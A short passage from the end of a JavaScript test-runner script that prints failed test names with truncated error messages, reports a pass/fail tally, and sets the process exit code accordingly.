  else { failed++; console.log('FAIL ' + r.name + '\n  ' + r.err.split('\n').slice(0, 4).join('\n  ')); }
}
console.log('\n' + (results.length - failed) + '/' + results.length + ' passed' + (failed ? ', ' + failed + ' FAILED' : ''));
process.exit(failed ? 1 : 0);
